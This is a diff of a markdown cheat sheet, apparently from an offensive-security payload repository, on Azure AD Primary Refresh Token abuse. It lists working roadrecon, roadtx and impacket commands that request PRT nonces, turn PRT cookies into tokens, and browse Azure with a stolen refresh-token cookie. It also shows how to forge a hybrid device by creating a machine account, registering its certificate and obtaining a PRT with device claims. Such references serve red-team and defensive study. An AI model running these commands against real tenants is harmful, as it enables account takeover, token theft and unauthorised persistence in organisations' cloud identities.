@@ -114,25 +114,28 @@ roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url 
 * No method known to date.
 
 
-### Use PRT cookie
+### Request a PRT using the Refresh Flow
 
-* `roadrecon auth prt-init`
-* Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof)
-* `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug`
+* Request a nonce from AAD: `roadrecon auth --prt-init -t <tenant-id>`
+* Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof) to initiate a new PRT request.
+* `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug` or  `roadtx gettoken --prt-cookie <x-ms-refreshtokencredential>`
 * Then browse to [login.microsoftonline.com ](login.microsoftonline.com ) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
 
 
 ### Request a PRT with Hybrid Device
 
-Requirements:    
+Requirements:
+
 * ADDS user credentials
 * hybrid environment (ADDS and Azure AD)
 
 Use the user account to create a computer and request a PRT
+
 * Create a computer account in AD: `impacket-addcomputer <domain>/<username>:<password> -dc-ip <dc-ip>`
 * Configure the computer certificate in AD with [dirkjanm/roadtools_hybrid](https://github.com/dirkjanm/roadtools_hybrid): `python setcert.py 10.10.10.10  -t '<machine-account$>' -u '<domain>\<machine-account$>' -p <machine-password>`
 * Register the hybrid device in Azure AD with this certificate: `roadtx hybriddevice -c '<machine-account>.pem' -k '<machine-account>.key' --sid '<device-sid>' -t '<aad-tenant-id>'`
 * Get a PRT with device claim
+
     ```ps1
     roadtx prt -c <hybrid-device-name>.pem -k <hybrid-device-name>.key -u <username>@h<domain> -p <password>
     roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
@@ -157,3 +160,4 @@ Use the user account to create a computer and request a PRT
 
 * [Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023](https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0)
 * [Microsoft 365 Developer Program](https://developer.microsoft.com/en-us/microsoft-365/dev-program)
+* [PRT Abuse from Userland with Cobalt Strike - 0xbad53c](https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike)
